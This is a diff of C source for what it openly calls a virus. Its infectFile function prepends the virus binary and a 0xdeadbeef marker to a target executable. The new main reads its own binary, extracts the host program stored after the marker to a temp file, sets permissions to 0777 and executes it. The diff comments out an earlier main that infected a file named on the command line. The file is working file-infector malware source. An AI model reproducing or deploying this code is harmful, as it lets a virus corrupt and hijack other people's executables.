@@ -8,7 +8,7 @@
 * Executes the file specified by filename.
 * If execution fails, prints an error and exits.
 */
-int runFile(const char *filename) {
+void runFile(const char *filename) {
     execv(filename, NULL);
     // If it returns, execv failed
     perror("execv failed");
@@ -23,7 +23,7 @@ int runFile(const char *filename) {
 long findDeadbeef(FILE *file) {
     printf("Searching for deadbeef pattern in file...\n");
     // Seed to beginning of the file
-    if(fseek(file, 0, SEEK_SET) < 0) {
+    if (fseek(file, 0, SEEK_SET) < 0) {
         perror("Could not seek to beginning of file");
         return -1;
     }
@@ -56,8 +56,8 @@ int copyFile(FILE *src, FILE *dest, long startPos) {
         return -1;
     }
 
-    // Copy content
-    unsigned char buffer[1024];
+    // Copy content one byte at a time
+    unsigned char buffer[1];
     size_t bytesRead;
     while ((bytesRead = fread(buffer, 1, sizeof(buffer), src)) > 0) {
         if (fwrite(buffer, 1, bytesRead, dest) != bytesRead) {
@@ -79,7 +79,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
     FILE *tempFile = fopen(tempFileName, "ab+");
 
     // Copy binaries to temp file
-    if(copyFile(virusFile, tempFile, 0) < 0) {
+    if (copyFile(virusFile, tempFile, 0) < 0) {
         printf("Could not copy virus to temp file\n");
         fclose(fileToInfect);
         fclose(virusFile);
@@ -87,8 +87,8 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         remove(tempFileName);
     }
     printf("Copied virus bin to temp file\n");
-    unsigned char deadbeef[] = {0xde, 0xad, 0xbe, 0xef};
-    if(fwrite(&deadbeef, sizeof(unsigned char), 4, tempFile) < 0) {
+    unsigned char deadbeef[] = { 0xde, 0xad, 0xbe, 0xef };
+    if (fwrite(&deadbeef, sizeof(unsigned char), 4, tempFile) < 0) {
         perror("Could not write deadbeef to temp file");
         fclose(fileToInfect);
         fclose(virusFile);
@@ -96,7 +96,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
         remove(tempFileName);
     }
     printf("Copied deadbeef to temp file\n");
-    if(copyFile(fileToInfect, tempFile, 0) < 0) {
+    if (copyFile(fileToInfect, tempFile, 0) < 0) {
         printf("Could not copy infected file to temp file\n");
         fclose(fileToInfect);
         fclose(virusFile);
@@ -106,7 +106,7 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
     printf("Copied infected bin to temp file\n");
 
     // Copy temp file to infected file
-    if(copyFile(tempFile, fileToInfect, 0) < 0) {
+    if (copyFile(tempFile, fileToInfect, 0) < 0) {
         printf("Could not copy infected binary back to infected file\n");
         fclose(fileToInfect);
         fclose(virusFile);
@@ -123,77 +123,124 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
     return 0;
 }
 
+// int main(int argc, char *argv[]) {
+//     printf("Virus running\n");
+//     // Process command line arguments
+//     if (argc < 2) {
+//         fprintf(stderr, "Usage: %s <filename>\n", argv[0]);
+//         return EXIT_FAILURE;
+//     }
+//     char *filename = argv[1];
+//     printf("Source file: %s\n", filename);
+
+//     // Open file for reading
+//     FILE *file = fopen(filename, "rb");
+//     if (file == NULL) {
+//         perror("Failed to open file");
+//         return EXIT_FAILURE;
+//     }
+
+//     // Find deadbeef in file
+//     long deadbeefPos = findDeadbeef(file);
+
+//     // If deadbeef is not found, infect the file
+//     if(deadbeefPos == -1) {
+//         printf("infecting file\n");
+//         infectFile(filename, argv[0]);
+//         deadbeefPos = findDeadbeef(file);
+//     }
+
+//     // If deadbeef is still not found, there has been an error
+//     if(deadbeefPos == -1) {
+//         printf("Could not find deadbeef, even after infecting\n");
+//         fclose(file);
+//         return EXIT_FAILURE;
+//     }
+//     printf("deadbeef position: %ld\n", deadbeefPos);
+
+//     // Make tmp directory if it doesn't exist
+//     struct stat sb;
+//     if (!(stat("./tem", &sb) == 0 && S_ISDIR(sb.st_mode))) {
+//         if (mkdir("./tem", 0777) == -1) {
+//             perror("Failed to create directory");
+//             fclose(file);
+//             return EXIT_FAILURE;
+//         }
+//     }
+
+//     // Create temporary file
+//     char *tempFilename = malloc(256);
+//     sprintf(tempFilename, "./tem/%s", filename);
+//     printf("Temporary file: %s\n", tempFilename);
+//     FILE *tempFile = fopen(tempFilename, "wb");
+//     if (tempFile == NULL) {
+//         perror("Failed to create temporary file");
+//         fclose(file);
+//         free(tempFilename);
+//         return EXIT_FAILURE;
+//     }
+//     if (chmod(tempFilename, 0777) == -1) {
+//         perror("Failed to set permissions on temporary file");
+//         fclose(file);
+//         fclose(tempFile);
+//         free(tempFilename);
+//         return EXIT_FAILURE;
+//     }
+
+//     // Copy content from original file to temporary file
+//     copyFile(file, tempFile, deadbeefPos);
+//     fclose(tempFile);
+//     fclose(file);
+
+//     // Execute the temporary file
+//     runFile(tempFilename);
+
+//     return 0;
+// }
+
 int main(int argc, char *argv[]) {
     printf("Virus running\n");
-    // Process command line arguments
-    if (argc < 2) {
-        fprintf(stderr, "Usage: %s <filename>\n", argv[0]);
-        return EXIT_FAILURE;
-    }
-    char *filename = argv[1];
-    printf("Source file: %s\n", filename);
 
-    // Open file for reading
-    FILE *file = fopen(filename, "rb");
-    if (file == NULL) {
-        perror("Failed to open file");
+    // Open own binary
+    FILE *ownBin = fopen(argv[0], "rb");
+    if (ownBin == NULL) {
+        perror("Failed to open own binary");
         return EXIT_FAILURE;
     }
 
-    // Find deadbeef in file
-    long deadbeefPos = findDeadbeef(file);
-
-    // If deadbeef is not found, infect the file
-    if(deadbeefPos == -1) {
-        printf("infecting file\n");
-        infectFile(filename, argv[0]);
-        deadbeefPos = findDeadbeef(file);
-    }
-
-    // If deadbeef is still not found, there has been an error
-    if(deadbeefPos == -1) {
-        printf("Could not find deadbeef, even after infecting\n");
-        fclose(file);
+    // Find deadbeef in own file
+    long deadbeefPos = findDeadbeef(ownBin);
+    if (deadbeefPos == -1) {
+        printf("Could not find deadbeef in own binary\n");
+        fclose(ownBin);
         return EXIT_FAILURE;
     }
-    printf("deadbeef position: %ld\n", deadbeefPos);
 
-    // Make tmp directory if it doesn't exist
-    struct stat sb;
-    if (!(stat("./tem", &sb) == 0 && S_ISDIR(sb.st_mode))) {
-        if (mkdir("./tem", 0777) == -1) {
-            perror("Failed to create directory");
-            fclose(file);
-            return EXIT_FAILURE;
-        }
-    }
-
-    // Create temporary file
-    char *tempFilename = malloc(256);
-    sprintf(tempFilename, "./tem/%s", filename);
-    printf("Temporary file: %s\n", tempFilename);
+    // Copy everything after deadbeef to a temp file
+    char *tempFilename = "temp_executable";
     FILE *tempFile = fopen(tempFilename, "wb");
     if (tempFile == NULL) {
         perror("Failed to create temporary file");
-        fclose(file);
-        free(tempFilename);
+        fclose(ownBin);
         return EXIT_FAILURE;
     }
     if (chmod(tempFilename, 0777) == -1) {
         perror("Failed to set permissions on temporary file");
-        fclose(file);
+        fclose(ownBin);
         fclose(tempFile);
-        free(tempFilename);
         return EXIT_FAILURE;
     }
-
-    // Copy content from original file to temporary file
-    copyFile(file, tempFile, deadbeefPos);
+    if (copyFile(ownBin, tempFile, deadbeefPos) < 0) {
+        printf("Could not copy to temporary file\n");
+        fclose(ownBin);
+        fclose(tempFile);
+        return EXIT_FAILURE;
+    }
+    fclose(ownBin);
     fclose(tempFile);
-    fclose(file);
 
-    // Execute the temporary file
+    // Execute the temp file
     runFile(tempFilename);
 
-    return 0;
+    return EXIT_SUCCESS;
 }
